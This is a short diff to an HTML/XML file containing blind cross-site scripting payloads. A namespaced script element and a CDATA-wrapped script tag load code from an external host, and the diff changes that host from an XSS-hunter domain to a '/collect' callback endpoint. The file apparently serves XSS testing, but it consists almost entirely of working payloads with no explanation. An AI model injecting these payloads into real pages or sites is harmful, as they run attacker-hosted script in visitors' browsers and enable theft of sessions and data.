@@ -1,11 +1,11 @@
 <html>
 	<head></head>
 	<body>
-		<something:script xmlns:something="http://www.w3.org/1999/xhtml">">src=https://averaver.xss.ht</something:script>
+		<something:script xmlns:something="http://www.w3.org/1999/xhtml">">src=https://b.mimilo4ka.com/collect?callback_token=test1</something:script>
 
 		<info>
 		  <name>
-		    <value><![CDATA[<script src=https://averaver.xss.ht></script>]]></value>
+		    <value><![CDATA[<script src=https://b.mimilo4ka.com/collect?callback_token=test1></script>]]></value>
 		  </name>
 		    <description>
 		      <value>Hello</value>
